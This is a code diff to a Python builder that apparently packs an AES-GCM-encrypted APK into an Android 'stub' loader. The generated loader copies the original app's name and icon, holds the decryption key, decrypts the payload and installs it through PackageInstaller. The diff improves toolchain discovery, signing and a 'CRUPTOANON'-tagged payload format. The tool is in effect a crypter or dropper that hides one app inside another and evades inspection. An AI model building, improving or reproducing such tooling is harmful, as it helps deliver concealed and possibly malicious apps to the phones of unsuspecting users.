@@ -1,4 +1,5 @@
 import logging
+import os
 import shutil
 import subprocess
 import zipfile
@@ -10,15 +11,226 @@ logger = logging.getLogger(__name__)
 
 class StubBuilder:
     def __init__(self):
-        self.android_home = "/opt/android-sdk"
-        self.build_tools = f"{self.android_home}/build-tools/34.0.0"
-        self.platform = f"{self.android_home}/platforms/android-34"
-        self.keystore = "/root/release.keystore"
-        self.keystore_pass = "android"
-        self.key_alias = "mykey"
+        self.android_home = None
+        self.build_tools = None
+        self.platform = None
+        self.aapt_path = None
+        self.d8_path = None
+        self.apksigner_path = None
+        self.zipalign_path = None
+        self.javac_path = None
+        self.keytool_path = None
+        self.keystore = None
+        self.keystore_pass = os.getenv("ANDROID_KEYSTORE_PASS", "android")
+        self.key_alias = os.getenv("ANDROID_KEY_ALIAS")
         self.temp_dir = Path("temp/stub_build")
         self.temp_dir.mkdir(parents=True, exist_ok=True)
         logger.info("StubBuilder initialized")
+
+    @staticmethod
+    def _pick_highest_version(paths: list[Path]) -> Path | None:
+        if not paths:
+            return None
+
+        def sort_key(path: Path):
+            parts = []
+            for item in path.name.replace("-", ".").split("."):
+                parts.append(int(item) if item.isdigit() else item)
+            return parts
+
+        return sorted(paths, key=sort_key, reverse=True)[0]
+
+    @staticmethod
+    def _first_existing_path(candidates: list[Path]) -> Path | None:
+        for candidate in candidates:
+            if candidate and candidate.exists():
+                return candidate
+        return None
+
+    @staticmethod
+    def _which(candidates: list[str]) -> str | None:
+        for candidate in candidates:
+            resolved = shutil.which(candidate)
+            if resolved:
+                return resolved
+        return None
+
+    def _find_android_home(self) -> Path | None:
+        env_candidates = [
+            os.getenv("ANDROID_HOME"),
+            os.getenv("ANDROID_SDK_ROOT"),
+        ]
+        for value in env_candidates:
+            if value:
+                candidate = Path(value).expanduser()
+                if candidate.exists():
+                    return candidate
+
+        home = Path.home()
+        local_app_data = os.getenv("LOCALAPPDATA")
+        path_candidates = [
+            Path(local_app_data) / "Android" / "Sdk" if local_app_data else None,
+            home / "AppData" / "Local" / "Android" / "Sdk",
+            home / "Android" / "Sdk",
+            home / "Android" / "sdk",
+            home / "Library" / "Android" / "sdk",
+            Path("/opt/android-sdk"),
+        ]
+        return self._first_existing_path([p for p in path_candidates if p is not None])
+
+    def _find_build_tools_dir(self, android_home: Path) -> Path | None:
+        build_tools_root = android_home / "build-tools"
+        if not build_tools_root.exists():
+            return None
+        return self._pick_highest_version([p for p in build_tools_root.iterdir() if p.is_dir()])
+
+    def _find_platform_dir(self, android_home: Path) -> Path | None:
+        platforms_root = android_home / "platforms"
+        if not platforms_root.exists():
+            return None
+        return self._pick_highest_version([p for p in platforms_root.iterdir() if p.is_dir()])
+
+    def _resolve_tool_from_dir(self, base_dir: Path | None, names: list[str]) -> str | None:
+        if base_dir:
+            for name in names:
+                candidate = base_dir / name
+                if candidate.exists():
+                    return str(candidate)
+        return self._which(names)
+
+    def _resolve_java_tool(self, tool_name: str) -> str | None:
+        java_home = os.getenv("JAVA_HOME")
+        candidates = []
+        if java_home:
+            java_bin = Path(java_home) / "bin"
+            candidates.extend(
+                [
+                    str(java_bin / f"{tool_name}.exe"),
+                    str(java_bin / f"{tool_name}.bat"),
+                    str(java_bin / tool_name),
+                ]
+            )
+
+        for candidate in candidates:
+            if Path(candidate).exists():
+                return candidate
+
+        return self._which([f"{tool_name}.exe", f"{tool_name}.bat", tool_name])
+
+    def _resolve_keystore(self) -> tuple[Path, bool]:
+        env_keystore = os.getenv("ANDROID_KEYSTORE")
+        if env_keystore:
+            return Path(env_keystore).expanduser(), False
+
+        debug_keystore = Path.home() / ".android" / "debug.keystore"
+        return debug_keystore, True
+
+    def _ensure_debug_keystore(self, keystore_path: Path):
+        if keystore_path.exists():
+            return
+
+        keystore_path.parent.mkdir(parents=True, exist_ok=True)
+        if not self.keytool_path:
+            raise RuntimeError(
+                "Android keystore not found and keytool is unavailable. "
+                "Set ANDROID_KEYSTORE or install a JDK with keytool."
+            )
+
+        cmd = [
+            self.keytool_path,
+            "-genkeypair",
+            "-v",
+            "-keystore",
+            str(keystore_path),
+            "-storepass",
+            "android",
+            "-alias",
+            "androiddebugkey",
+            "-keypass",
+            "android",
+            "-keyalg",
+            "RSA",
+            "-keysize",
+            "2048",
+            "-validity",
+            "10000",
+            "-dname",
+            "CN=Android Debug,O=Android,C=US",
+        ]
+        subprocess.run(cmd, check=True, capture_output=True, text=True)
+
+    def _ensure_toolchain(self):
+        if all(
+            [
+                self.android_home,
+                self.build_tools,
+                self.platform,
+                self.aapt_path,
+                self.d8_path,
+                self.apksigner_path,
+                self.zipalign_path,
+                self.javac_path,
+                self.keystore,
+            ]
+        ):
+            return
+
+        android_home = self._find_android_home()
+        if not android_home:
+            raise RuntimeError(
+                "Android SDK not found. Set ANDROID_HOME or ANDROID_SDK_ROOT "
+                "to your SDK path."
+            )
+
+        build_tools_dir = self._find_build_tools_dir(android_home)
+        if not build_tools_dir:
+            raise RuntimeError(f"Android build-tools not found under {android_home}.")
+
+        platform_dir = self._find_platform_dir(android_home)
+        if not platform_dir or not (platform_dir / "android.jar").exists():
+            raise RuntimeError(f"Android platform with android.jar not found under {android_home}.")
+
+        self.android_home = str(android_home)
+        self.build_tools = str(build_tools_dir)
+        self.platform = str(platform_dir)
+        self.aapt_path = self._resolve_tool_from_dir(build_tools_dir, ["aapt.exe", "aapt"])
+        self.d8_path = self._resolve_tool_from_dir(build_tools_dir, ["d8.bat", "d8.cmd", "d8"])
+        self.apksigner_path = self._resolve_tool_from_dir(
+            build_tools_dir,
+            ["apksigner.bat", "apksigner.cmd", "apksigner"],
+        )
+        self.zipalign_path = self._resolve_tool_from_dir(build_tools_dir, ["zipalign.exe", "zipalign"])
+        self.javac_path = self._resolve_java_tool("javac")
+        self.keytool_path = self._resolve_java_tool("keytool")
+
+        missing = []
+        for label, value in [
+            ("aapt", self.aapt_path),
+            ("d8", self.d8_path),
+            ("apksigner", self.apksigner_path),
+            ("zipalign", self.zipalign_path),
+            ("javac", self.javac_path),
+        ]:
+            if not value:
+                missing.append(label)
+
+        if missing:
+            raise RuntimeError(f"Missing required Android build tools: {', '.join(missing)}.")
+
+        keystore_path, uses_debug_keystore = self._resolve_keystore()
+        if uses_debug_keystore:
+            self._ensure_debug_keystore(keystore_path)
+            if not self.key_alias:
+                self.key_alias = "androiddebugkey"
+            if "ANDROID_KEYSTORE_PASS" not in os.environ:
+                self.keystore_pass = "android"
+        else:
+            if not keystore_path.exists():
+                raise RuntimeError(f"Configured keystore not found: {keystore_path}")
+            if not self.key_alias:
+                self.key_alias = "mykey"
+
+        self.keystore = str(keystore_path)
 
     @staticmethod
     def _extract_named_value(line: str, key: str):
@@ -129,10 +341,6 @@ class StubBuilder:
 
     def extract_apk_info(self, apk_path: str) -> dict:
         logger.info("Extracting APK metadata: %s", apk_path)
-        aapt_path = f"{self.build_tools}/aapt"
-        cmd = [aapt_path, "dump", "badging", apk_path]
-        result = subprocess.run(cmd, capture_output=True, text=True)
-
         info = {
             "package": "com.app",
             "label": Path(apk_path).stem,
@@ -144,6 +352,15 @@ class StubBuilder:
             "icon_candidates": [],
             "original_filename": Path(apk_path).name,
         }
+
+        try:
+            self._ensure_toolchain()
+        except RuntimeError as exc:
+            logger.warning("Android toolchain unavailable while reading APK metadata: %s", exc)
+            return info
+
+        cmd = [self.aapt_path, "dump", "badging", apk_path]
+        result = subprocess.run(cmd, capture_output=True, text=True)
 
         if result.returncode != 0:
             logger.warning("aapt dump badging failed: %s", result.stderr.strip())
@@ -229,6 +446,7 @@ class StubBuilder:
 
     def build_stub_apk(self, aes_key_hex: str, original_apk_path: str, encrypted_payload: bytes) -> str:
         logger.info("Starting stub build, payload size: %s bytes", len(encrypted_payload))
+        self._ensure_toolchain()
         apk_info = self.extract_apk_info(original_apk_path)
 
         project_dir = self.temp_dir / "stub_project"
@@ -298,7 +516,7 @@ class StubBuilder:
         output_dir.mkdir(parents=True, exist_ok=True)
 
         cmd = [
-            "javac",
+            self.javac_path,
             "-source",
             "1.8",
             "-target",
@@ -314,11 +532,12 @@ class StubBuilder:
 
     def convert_to_dex(self, project_dir: Path):
         classes_dir = project_dir / "bin" / "classes"
-        d8_path = f"{self.build_tools}/d8"
         class_files = list(classes_dir.rglob("*.class"))
+        if not class_files:
+            raise RuntimeError("Java compilation produced no .class files.")
 
         cmd = [
-            d8_path,
+            self.d8_path,
             "--lib",
             f"{self.platform}/android.jar",
             "--output",
@@ -332,10 +551,9 @@ class StubBuilder:
         unsigned_apk = project_dir / "stub_unsigned.apk"
         dex_file = project_dir / "bin" / "classes.dex"
         assets_dir = project_dir / "assets"
-        aapt_path = f"{self.build_tools}/aapt"
 
         cmd = [
-            aapt_path,
+            self.aapt_path,
             "package",
             "-f",
             "-M",
@@ -364,7 +582,7 @@ class StubBuilder:
         signed_apk = unsigned_apk.replace("_unsigned.apk", "_signed.apk")
 
         cmd = [
-            "zipalign",
+            self.zipalign_path,
             "-f",
             "4",
             unsigned_apk,
@@ -375,14 +593,15 @@ class StubBuilder:
         if result.returncode != 0:
             raise Exception(f"zipalign failed: {result.stderr}")
 
-        apksigner_path = f"{self.build_tools}/apksigner"
         cmd = [
-            apksigner_path,
+            self.apksigner_path,
             "sign",
             "--ks",
             self.keystore,
             "--ks-pass",
             f"pass:{self.keystore_pass}",
+            "--ks-key-alias",
+            self.key_alias,
             "--key-pass",
             f"pass:{self.keystore_pass}",
             "--out",
@@ -394,7 +613,7 @@ class StubBuilder:
         if result.returncode != 0:
             raise Exception(f"apksigner sign failed: {result.stderr}")
 
-        cmd = [apksigner_path, "verify", signed_apk]
+        cmd = [self.apksigner_path, "verify", signed_apk]
         result = subprocess.run(cmd, capture_output=True, text=True)
         if result.returncode != 0:
             raise Exception(f"APK signature verification failed: {result.stderr}")
@@ -404,6 +623,9 @@ class StubBuilder:
     def generate_loader_activity(self, aes_key_hex: str, apk_info: dict) -> str:
         output_apk_name = self._java_escape(apk_info["original_filename"])
         app_label = self._java_escape(apk_info["label"])
+        payload_magic = "CRUPTOANON"
+        payload_aad = "CRUPTOANON:v1"
+        payload_version = 1
 
         return f'''package com.loader;
 
@@ -420,6 +642,7 @@ import android.os.Looper;
 import android.provider.Settings;
 import android.content.pm.PackageInstaller;
 import java.io.*;
+import java.nio.charset.StandardCharsets;
 import javax.crypto.Cipher;
 import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
@@ -427,6 +650,9 @@ import javax.crypto.spec.SecretKeySpec;
 public class LoaderActivity extends Activity {{
 
     private static final byte[] AES_KEY = hexToBytes("{aes_key_hex}");
+    private static final byte[] PAYLOAD_MAGIC = "{payload_magic}".getBytes(StandardCharsets.US_ASCII);
+    private static final byte PAYLOAD_VERSION = (byte) {payload_version};
+    private static final byte[] PAYLOAD_AAD = "{payload_aad}".getBytes(StandardCharsets.US_ASCII);
     private static final String OUTPUT_APK_NAME = "{output_apk_name}";
     private static final String APP_LABEL = "{app_label}";
     private File apkFile;
@@ -553,22 +779,41 @@ public class LoaderActivity extends Activity {{
     }}
 
     private byte[] decryptAES(byte[] encrypted) throws Exception {{
+        if (encrypted.length < PAYLOAD_MAGIC.length + 1 + 12 + 16) {{
+            throw new IOException("Payload too short");
+        }}
+
+        for (int i = 0; i < PAYLOAD_MAGIC.length; i++) {{
+            if (encrypted[i] != PAYLOAD_MAGIC[i]) {{
+                throw new IOException("Invalid payload header");
+            }}
+        }}
+
+        int offset = PAYLOAD_MAGIC.length;
+        if (encrypted[offset] != PAYLOAD_VERSION) {{
+            throw new IOException("Unsupported payload version");
+        }}
+        offset += 1;
+
         byte[] nonce = new byte[12];
-        System.arraycopy(encrypted, 0, nonce, 0, 12);
+        System.arraycopy(encrypted, offset, nonce, 0, 12);
+        offset += 12;
 
         byte[] tag = new byte[16];
-        System.arraycopy(encrypted, 12, tag, 0, 16);
+        System.arraycopy(encrypted, offset, tag, 0, 16);
+        offset += 16;
 
-        byte[] ciphertext = new byte[encrypted.length - 28];
-        System.arraycopy(encrypted, 28, ciphertext, 0, ciphertext.length);
+        byte[] ciphertext = new byte[encrypted.length - offset];
+        System.arraycopy(encrypted, offset, ciphertext, 0, ciphertext.length);
 
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         GCMParameterSpec spec = new GCMParameterSpec(128, nonce);
         cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(AES_KEY, "AES"), spec);
+        cipher.updateAAD(PAYLOAD_AAD);
 
-        byte[] input = new byte[ciphertext.length + 16];
+        byte[] input = new byte[ciphertext.length + tag.length];
         System.arraycopy(ciphertext, 0, input, 0, ciphertext.length);
-        System.arraycopy(tag, 0, input, ciphertext.length, 16);
+        System.arraycopy(tag, 0, input, ciphertext.length, tag.length);
 
         return cipher.doFinal(input);
     }}
